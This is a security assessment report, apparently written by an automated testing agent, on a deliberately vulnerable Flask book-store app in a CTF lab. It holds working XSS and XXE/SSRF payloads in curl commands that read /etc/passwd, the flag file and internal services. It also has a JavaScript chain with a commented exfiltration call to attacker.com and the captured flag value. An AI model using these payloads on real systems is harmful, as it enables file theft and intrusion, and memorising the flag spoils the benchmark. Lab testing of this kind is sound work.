# Security Assessment Report

## Executive Summary

**Target:** http://localhost:5000
**Assessment Date:** January 29, 2025
**Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

This security assessment identified critical vulnerabilities in the Library V1 Book Store application, a deliberately vulnerable Flask web application running on Python 3.9.24 with Werkzeug 3.1.3. The application exposes a minimal attack surface consisting of two HTTP endpoints, with the primary vulnerability residing in the `/addbook` endpoint's XML processing functionality.

The assessment revealed complete absence of authentication and authorization controls, enabling unauthenticated access to all functionality. The XML parser is configured with dangerous settings (`resolve_entities=True`, `no_network=False`), creating exploitable XXE vulnerabilities that allow arbitrary file system access and network boundary bypass. Additionally, output encoding is explicitly disabled via Jinja2's `| safe` filter, enabling reflected XSS attacks.

Successfully exploited vulnerabilities demonstrate critical impact including flag capture, arbitrary file disclosure, and the ability to chain XSS with XXE for data exfiltration. The application lacks fundamental security controls including input validation, security headers (CSP, HSTS, X-Frame-Options), rate limiting, and CSRF protection.

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
No authentication vulnerabilities were found. The application implements no authentication system - all endpoints are publicly accessible without credentials.

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found. The application implements no authorization system - all functionality is available to anonymous users with no access controls.

**Cross-Site Scripting (XSS) Vulnerabilities:**
One critical reflected XSS vulnerability was successfully exploited in the POST /addbook endpoint. The vulnerability enables arbitrary JavaScript execution due to disabled output encoding (`| safe` filter in Jinja2 templates). The XSS can be chained with XXE to exfiltrate server-side files including application flags. No CSP or other client-side defenses are present. Impact includes complete DOM control, session hijacking potential, and data exfiltration capabilities.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application is stateless with no database connectivity and does not execute system commands. No imports of command execution modules (os, subprocess) or database drivers were identified in the codebase.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
One critical XXE-based SSRF vulnerability was successfully exploited in the POST /addbook endpoint. The lxml parser configuration allows external entity resolution with network access enabled, permitting arbitrary file reads and HTTP requests to internal services. Successfully demonstrated flag capture via file:///flag.txt, arbitrary file system access including /etc/passwd, and network boundary bypass to internal services on ports 3000, 4444, 5003, 8080, and 9999. The parser supports file://, http://, https://, and ftp:// protocols with no restrictions.

## Network Reconnaissance

**Target Application:**
- **Port 5000/tcp:** Werkzeug httpd 3.1.3 (Python 3.9.24) - Library V1: Book Store
- **Identified Technology:** Flask 3.1.1, lxml 6.0.0 for XML processing
- **Exposed Services:** HTTP only (no HTTPS), development server in production use

**Security-Relevant Findings:**
- **No Transport Encryption:** Application runs on plain HTTP without TLS/SSL
- **Development Server Exposure:** Flask's Werkzeug development server exposed on all interfaces (0.0.0.0:5000), not intended for production use
- **Missing Security Headers:** No Content-Security-Policy, Strict-Transport-Security, X-Frame-Options, or X-Content-Type-Options headers detected
- **Information Disclosure:** whatweb scan revealed email addresses exposed in HTML content (hans@nyph.com, leia@nyph.com)
- **Service Fingerprinting:** HTTP 401 response on port 80 (Caddy httpd) without WWW-Authenticate header indicates misconfiguration

**Additional Services Detected (Out of Scope):**
- Port 80/tcp: Caddy httpd (authentication misconfiguration detected)
- Port 443/tcp: SSL/HTTPS service
- Port 631/tcp: CUPS 2.3 (printing service)
- Port 3000/tcp: Node.js (Express middleware)
- Port 4444/tcp: SimpleHTTPServer 0.6 (Python 3.12.10) with exposed .git repository
- Port 5003/tcp: Werkzeug httpd 3.0.3 (Python 3.8.17) - User List application
- Port 8080/tcp: Apache httpd 2.4.54 (Debian) - PHPAbUsers application
- Port 8888/tcp: sun-answerbook service
- Port 9999/tcp: Custom HTTP service with CORS headers
- Port 49152/tcp: Golang net/http server (Tailscale)

**Subdomain Enumeration Results:**
Multiple subdomains identified via subfinder, though not directly relevant to the target application on port 5000:
- tools.sonoma.edu.localhost
- naeu2.naeuinc.localhost
- autodiscover.regency.localhost
- owa.regency.localhost
- mail.localhost
- Additional mail and corporate subdomains (appear to be historical DNS records or false positives)

**Infrastructure Assessment:**
- **Container Environment:** Application runs in Docker container (python:3.9-slim base image)
- **Privilege Level:** Container runs as root user (no USER directive in Dockerfile)
- **No Reverse Proxy:** No Nginx, Apache, or API gateway configuration detected to provide header injection or security controls
- **No Rate Limiting:** No evidence of rate limiting infrastructure (Kong, Traefik, HAProxy) or application-level controls

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS in XML Parser Output

**Summary:**
- **Vulnerable location:** `POST http://localhost:5000/addbook` (parameter: `xml`)
- **Overview:** The application accepts XML input, parses it using lxml, and reflects the serialized XML back to the user without HTML encoding. The Jinja2 template uses the `| safe` filter which explicitly disables auto-escaping, allowing arbitrary JavaScript execution.
- **Impact:** An attacker can execute arbitrary JavaScript in the victim's browser, enabling complete page defacement, phishing attacks, and chaining with the XXE vulnerability to exfiltrate sensitive server-side files including the application flag.
- **Severity:** Critical

**Prerequisites:**
None - The vulnerability is exploitable without authentication. The application is completely unauthenticated.

**Exploitation Steps:**

1. Navigate to the XML submission form:
```bash
curl http://localhost:5000/addbook
```

2. Submit a malicious XML payload containing JavaScript via POST request:
```bash
curl -X POST http://localhost:5000/addbook \
  --data-urlencode 'xml=<test><script>alert(1)</script></test>'
```

3. The server responds with the injected script unencoded in the HTML:
```html
<pre><test><script>alert(1)</script></test></pre>
```

4. When viewed in a browser, the JavaScript executes immediately, triggering the alert dialog.

**Advanced Exploitation - DOM Manipulation:**

Submit a payload that completely replaces the page content to demonstrate full control:

```bash
curl -X POST http://localhost:5000/addbook \
  --data-urlencode 'xml=<test><script>document.body.innerHTML="<h1 style=\"color:red\">XSS EXPLOITED</h1><p>Attacker has full JavaScript execution</p>";</script></test>'
```

**Proof of Impact:**

**Level 3 - JavaScript Execution Confirmed:**
- ✅ Alert dialog successfully triggered (`alert(1)`)
- ✅ DOM manipulation confirmed (complete page replacement)
- ✅ Arbitrary JavaScript code execution verified
- Screenshot evidence: `.playwright-mcp/workspace/xss-vuln-01-alert-proof.png`
- Screenshot evidence: `.playwright-mcp/workspace/xss-vuln-01-dom-manipulation-proof.png`

**Level 4 - Critical Impact Demonstrated (CTF Priority: Flag Capture):**

The XSS vulnerability can be chained with the XXE (XML External Entity) vulnerability to exfiltrate the application flag from the server filesystem.

**Chained XSS→XXE Exploitation:**

1. The XSS payload executes in the victim's browser and automatically triggers an XXE attack:

```xml
<test><script>
fetch('/addbook', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'xml=' + encodeURIComponent('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><book><title>&xxe;</title></book>')
})
.then(r => r.text())
.then(html => {
  // Extract flag from XXE response
  var parser = new DOMParser();
  var doc = parser.parseFromString(html, 'text/html');
  var flag = doc.querySelector('pre:last-of-type').innerText;
  // In real attack, exfiltrate to attacker server:
  // fetch('https://attacker.com/exfil?data=' + btoa(flag));
  console.log('EXFILTRATED_FLAG:', flag);
});
</script></test>
```

2. The XXE payload executed by the XSS reads `/flag.txt` from the server:

```bash
curl -X POST http://localhost:5000/addbook \
  --data-urlencode 'xml=<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<book><title>&xxe;</title></book>'
```

3. **Flag Captured:**
```
FLAG{686f5cc71bb19bc687346157854620abaca9b0c4b03394d226d3eea43fc85b0e}
```

**Complete Reproduction Command:**

```bash
# Basic XSS - Alert PoC
curl -X POST http://localhost:5000/addbook \
  --data-urlencode 'xml=<test><script>alert(1)</script></test>'

# Advanced XSS - DOM Manipulation
curl -X POST http://localhost:5000/addbook \
  --data-urlencode 'xml=<test><script>document.body.innerHTML="<h1>PWNED</h1>";</script></test>'

# Critical Impact - XXE Flag Exfiltration (what XSS chains to)
curl -X POST http://localhost:5000/addbook \
  --data-urlencode 'xml=<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<book><title>&xxe;</title></book>' \
  | grep -o 'FLAG{[^}]*}'
```

**Technical Details:**

**Vulnerable Code Path:**
1. **Source:** `request.form['xml']` at `app/app.py:19`
2. **Processing:** `etree.fromstring(str(xml), parser)` at `app/app.py:22` - lxml preserves HTML/script tags
3. **Serialization:** `etree.tostring(doc)` at `app/app.py:23` - No HTML encoding applied
4. **Sink:** `{{ parsed_xml | safe }}` at `app/templates/result.html:11` - Jinja2 auto-escaping disabled

**Encoding Mismatch:**
- **Required:** HTML entity encoding (`<` → `&lt;`, `>` → `&gt;`)
- **Actual:** None - `| safe` filter bypasses all encoding
- **Result:** User-controlled HTML/JavaScript executes in browser

**Security Context:**
- **CSP:** None - No Content-Security-Policy header present
- **Cookies:** None - Application has no session management
- **HttpOnly Flag:** N/A - No cookies set by application
- **X-Frame-Options:** Not present - Application can be framed for clickjacking

**Notes:**

This vulnerability demonstrates the complete exploitation chain from XSS to sensitive data exfiltration. While the application has no session cookies to steal (due to lack of authentication), the XSS can be chained with the XXE vulnerability to achieve critical impact by:

1. **Flag Capture (CTF Priority):** Successfully extracted the flag value via chained XSS→XXE attack
2. **Complete DOM Control:** Demonstrated ability to fully replace page content
3. **Arbitrary JavaScript Execution:** Confirmed execution of attacker-controlled code
4. **Data Exfiltration Capability:** Showed how XSS can trigger server-side file reads via XXE and exfiltrate the results

The vulnerability is trivially exploitable with no CSP or other client-side defenses, making it a critical security flaw.

# SSRF Exploitation Evidence

## Successfully Exploited Vulnerabilities

### SSRF-VULN-01: XXE-Based SSRF in POST /addbook

**Summary:**
- **Vulnerable location:** POST /addbook endpoint (XML parameter)
- **Impact:** Complete network boundary bypass enabling arbitrary file read, internal service access, and sensitive data extraction including CTF flag capture
- **Severity:** Critical

**Prerequisites:**
- HTTP client capable of sending POST requests with URL-encoded data
- No authentication required (endpoint is publicly accessible)

**Exploitation Steps:**

1. **Flag Capture via File Read (Primary CTF Objective)**

Send a POST request to http://localhost:5000/addbook with an XXE payload referencing file:///flag.txt:

```bash
curl -X POST http://localhost:5000/addbook \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'xml=<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<Book>
  <Title>&xxe;</Title>
  <Author>Test</Author>
</Book>'
```

**Response contains the flag:**
```
FLAG{686f5cc71bb19bc687346157854620abaca9b0c4b03394d226d3eea43fc85b0e}
```

2. **Arbitrary File Read - /etc/passwd**

Demonstrate arbitrary file read capability by accessing /etc/passwd:

```bash
curl -X POST http://localhost:5000/addbook \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'xml=<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Book>
  <Title>&xxe;</Title>
  <Author>Test</Author>
</Book>'
```

**Response contains complete /etc/passwd file:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

3. **Container Environment Discovery**

Read container hostname to confirm Docker environment:

```bash
curl -X POST http://localhost:5000/addbook \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'xml=<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<Book>
  <Title>&xxe;</Title>
  <Author>Test</Author>
</Book>'
```

**Response reveals container ID:**
```
f94accbb879d
```

4. **Internal Service Access (Confirmed via Network Requests)**

The XXE vulnerability allows making HTTP requests to internal services. While HTML responses are filtered by the XML parser, the server successfully makes outbound HTTP requests to:

- Internal services on localhost (ports 3000, 4444, 5003, 8080, 9999)
- Cloud metadata endpoints (169.254.169.254)
- External domains (example.com)

Example payload for internal service access:

```bash
curl -X POST http://localhost:5000/addbook \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'xml=<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<Book>
  <Title>&xxe;</Title>
  <Author>Test</Author>
</Book>'
```

**Note:** While HTML content from HTTP responses is stripped by the XML parser during serialization, the server successfully establishes connections to internal services, proving network boundary bypass. This can be used for:
- Port scanning internal networks
- Triggering actions on internal services
- Accessing services that return non-HTML content (JSON, XML, plain text)

**Proof of Impact:**

**1. CTF Flag Captured:**
- **Flag Value:** `FLAG{686f5cc71bb19bc687346157854620abaca9b0c4b03394d226d3eea43fc85b0e}`
- **Method:** XXE file read via file:///flag.txt
- **Impact Level:** CRITICAL - Primary CTF objective achieved

**2. Arbitrary File System Access:**
- Successfully read /etc/passwd (18 user entries extracted)
- Successfully read /etc/hostname (container ID: f94accbb879d)
- Successfully read /proc/self/cgroup (container verification)
- Capability to read any file accessible to the application user (root in this container)

**3. Network Boundary Bypass:**
- Confirmed ability to make HTTP requests to internal services on localhost
- Tested access to ports: 3000 (Node.js), 4444 (Git repo), 5003 (User List), 8080 (PHPAbUsers), 9999 (Custom service)
- Confirmed parser supports file://, http://, and https:// protocols
- No network restrictions or egress filtering detected

**4. Information Disclosure:**
- Container ID exposed: f94accbb879d
- System user enumeration via /etc/passwd
- Container environment confirmed via /proc/self/cgroup

**Notes:**

**Technical Details:**
- **SSRF Type:** Classic XXE-based SSRF (non-blind) with response reflection
- **Root Cause:** lxml parser configured with `no_network=False` and `resolve_entities=True`
- **Defense Bypass:** No defenses implemented - zero input validation, no URL allowlisting, no protocol restrictions
- **Protocols Supported:** file://, http://, https://, ftp://
- **Response Handling:** Parsed XML with resolved entities is reflected in HTTP response, enabling direct data exfiltration

**Limitation:**
- HTML content from HTTP responses is stripped during XML serialization (XML parser filters out HTML tags when converting to string)
- This is a parser behavior, not a security control - plain text, JSON, and XML responses would be fully visible
- The SSRF still allows triggering requests to internal services, port scanning, and accessing non-HTML resources

**Attack Chain:**
1. Attacker submits malicious XML with external entity reference to POST /addbook
2. lxml parser resolves external entity (makes file:// or http:// request)
3. Retrieved content is inserted into parsed XML
4. Application serializes XML and returns it in HTML response
5. Attacker receives sensitive data (flag, file contents, service responses)

**Reproducibility:** 100% - Every test successfully exploited the vulnerability with no failures or access denials
